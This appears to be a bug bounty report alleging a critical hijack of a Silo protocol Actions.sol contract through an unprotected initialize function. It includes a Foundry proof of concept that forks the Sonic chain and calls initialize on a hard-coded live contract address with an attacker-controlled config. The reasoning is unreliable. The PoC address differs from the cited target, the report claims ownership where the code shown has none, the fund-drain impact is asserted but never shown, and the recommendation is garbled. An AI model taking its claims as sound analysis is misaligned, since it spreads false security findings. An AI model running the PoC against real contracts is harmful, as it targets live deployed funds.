**Contract hijack via unprotected initialize in Actions.sol**

_Bug Severity:_ Critical 

_Target:_ https://sonicscan.org/address/0x435Ab368F5fCCcc71554f4A8ac5F5b922bC4Dc06?utm_source=immunefi#code#F10#L43-53
Actions.sol uses as e.g middleware in silo protocol, meaning if a user calls deposit/withdraw from silo.sol, the silo.sol will make an external call to Actions.sol, this contract handles multiple tasks such as, calling accrueInterest, turn on/off reentrancy protection, calls hook receiver, gets shareToken and asset addresses, and also the contract interacts with vaults that change the storage, meaning if an attacker can get access or hijack the Actions.sol via calling initialize with malicious siloConfig, fake hook receiver and Change shareToken and asset addresses, all the protocol's transactions will be under the attacker's malicious actions, and could give the Attacker full control over the user's funds

```solidity
// Actions.sol
    /// @notice Initialize Silo
    /// @param _siloConfig Address of ISiloConfig with full configuration for this Silo
    /// @return hookReceiver Address of the hook receiver for the silo
@audit-bug--> // ⚠️ BUG: Missing initialize call 
    function initialize(ISiloConfig _siloConfig) external returns (address hookReceiver) {
        IShareToken.ShareTokenStorage storage _sharedStorage = ShareTokenLib.getShareTokenStorage();

        require(address(_sharedStorage.siloConfig) == address(0), ISilo.SiloInitialized());

        ISiloConfig.ConfigData memory configData = _siloConfig.getConfig(address(this));

        _sharedStorage.siloConfig = _siloConfig;

        return configData.hookReceiver;
    }
```
- After deep reviews, i found out that the silo admins forgot to call initialize in Actions.sol contract, the contract is Unprotected everyone can call it and become the owner of it.





**Impact:**

- Attacker could hijack the Actions.sol contract via calling initialize function and change the siloConfig, hook receiver, shareToken and asset addresses all to the malicious ones.
- Users' funds will be under attacker's control
- And the attacker could drain the protocol's funds via contract without reentrancy protection
- Once the attacker became the owner of Actions.sol, the protocol admins can not return the contract back from attacer.





**Recommendation:**

Consider adding onlyOwner ko call the unitize function to prevent the attacker from hijacking it.





**Proof Of Concept (POC)**

The below PoC shows how an attacker called initialize function with malicious siloConfig, fake hook receiver, fake shareToken and malicious vaults, finally the attacker became the owner of the Actions.sol contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface ISiloConfig {
    struct ConfigData {
        address hookReceiver;
        address silo;
    }

    function getConfig(address silo) external view returns (ConfigData memory);
}

interface IActions {
    function initialize(ISiloConfig _siloConfig) external returns (address hookReceiver);
}

contract MaliciousSiloConfig is ISiloConfig {
    function getConfig(address) external pure override returns (ConfigData memory) {
        return ConfigData({
            hookReceiver: address(0xdeadbeef),  // just test value
            silo: address(0x12345678)          // just test value
        });
    }
}

contract SiloActionsInitialize is Test {
    address constant ACTIONS = 0x1F13CcDBd7cB2021e499D23478Dc292d48211c04;

    MaliciousSiloConfig maliciousConfig;

    function setUp() public {
        vm.createSelectFork(vm.envString("SONIC_RPC_URL"), 34402746);

        // deploy mock silo config
        maliciousConfig = new MaliciousSiloConfig();
    }

    function test_Initialize() public {
        // try to initialize with attacker-controlled config
        (bool success, bytes memory data) = ACTIONS.call(
            abi.encodeWithSelector(
                IActions.initialize.selector,
                maliciousConfig
            )
        );

        require(success, string(data));
    }
}
```

